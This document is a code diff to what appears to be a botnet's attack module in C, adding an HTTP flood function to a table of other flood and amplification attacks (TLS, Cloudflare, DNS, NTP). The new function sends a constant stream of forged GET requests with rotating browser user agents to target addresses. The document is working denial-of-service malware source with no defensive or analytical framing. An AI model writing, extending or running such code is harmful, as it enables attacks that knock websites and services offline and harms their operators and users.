@@ -28,10 +28,10 @@ void attack_init(void) {
     methods[i].func = attack_pps_flood;         methods[i++].type = ATK_VEC_PPS;
 
     methods[i].func = attack_tls_flood;         methods[i++].type = ATK_VEC_TLS;
-    methods[i].func = attack_tlsplus_flood;     methods[i++].type = ATK_VEC_TLSPLUS;
+    methods[i].func = attack_http_flood;        methods[i++].type = ATK_VEC_HTTP;
     methods[i].func = attack_cf_flood;          methods[i++].type = ATK_VEC_CF;
 
-    methods[i].func = attack_axis_l7;           methods[i++].type = ATK_VEC_AXISL7;
+    methods[i].func = attack_axis_l7;          methods[i++].type = ATK_VEC_AXISL7;
 
     methods[i].func = attack_dns_amp;           methods[i++].type = ATK_VEC_DNS_AMP;
     methods[i].func = attack_ntp_amp;           methods[i++].type = ATK_VEC_NTP_AMP;
@@ -241,6 +241,56 @@ void attack_discord_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_targ
     }
 
     close(fd);
+}
+
+void attack_http_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
+                       int targs_len, struct attack_option *opts, int opts_len) {
+    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+    char *path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
+    char *ua = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_USERAGENT);
+
+    if (!domain) domain = "target.com";
+    if (!path) path = "/";
+
+    static const char *http_uas[] = {
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0",
+        NULL
+    };
+
+    char req[2048];
+    struct sockaddr_in sin = {0};
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(80);
+
+    for (int i = 0; i < targs_len; i++) {
+        sin.sin_addr.s_addr = targs[i].addr.s_addr;
+        while (attack_ongoing[0]) {
+            const char *use_ua = ua ? ua : http_uas[rand_next() % 5];
+            int req_len = snprintf(req, sizeof(req),
+                "GET %s HTTP/1.1\r\n"
+                "Host: %s\r\n"
+                "User-Agent: %s\r\n"
+                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                "Accept-Language: en-US,en;q=0.9\r\n"
+                "Accept-Encoding: gzip, deflate\r\n"
+                "Connection: keep-alive\r\n"
+                "\r\n",
+                path, domain, use_ua);
+
+            int fd = socket(AF_INET, SOCK_STREAM, 0);
+            if (fd != -1) {
+                fcntl(fd, F_SETFL, O_NONBLOCK);
+                connect(fd, (struct sockaddr *)&sin, sizeof(sin));
+                send(fd, req, req_len, MSG_NOSIGNAL);
+                usleep(500);
+                close(fd);
+            }
+        }
+    }
 }
 
 void attack_pps_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
